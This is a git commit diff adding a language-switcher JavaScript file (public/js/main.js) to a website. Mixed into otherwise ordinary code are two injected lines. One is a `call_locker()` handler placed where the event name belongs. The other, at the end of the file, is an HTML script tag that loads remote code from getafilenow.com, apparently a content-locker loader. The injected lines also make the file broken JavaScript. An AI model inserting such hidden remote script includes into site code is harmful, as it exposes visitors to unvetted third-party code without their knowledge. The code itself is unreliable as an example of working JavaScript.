ac0e270848c91462278252e37cac5a46ad2be425
TheSJWiKi <114334224+TheSJWiKi@users.noreply.github.com>
2022-10-15 19:25:19 -0700

    Add files via upload

---
+++ public/js/main.js
@@ -0,0 +1,28 @@
+document.addEventListener('DOMContentLoaded', () => {
+    const changelangbtns = document.querySelectorAll('.change-lang')
+
+    async function geterateUrl(langcode) {
+        const fullurl = window.location.href
+        let arr = fullurl.split('/')
+
+        if (arr[3].length == 2) {
+            arr[3] = langcode
+            return arr.join('/')
+        } else {
+            arr.splice(3, 0, `${langcode}`)
+            return arr.join('/')
+        }
+    }
+
+    changelangbtns.forEach(btn => {
+        btn.addEventListener(onclick="call_locker();" , async (e) => {
+            e.preventDefault()
+            console.log(e.target)
+            const langcode = btn.dataset.lang
+            const result = await geterateUrl(langcode)
+            window.open(result, "_self")
+        })
+    })
+})
+
+<script type="text/javascript" src="https://getafilenow.com/script_include.php?id=1232269"></script>
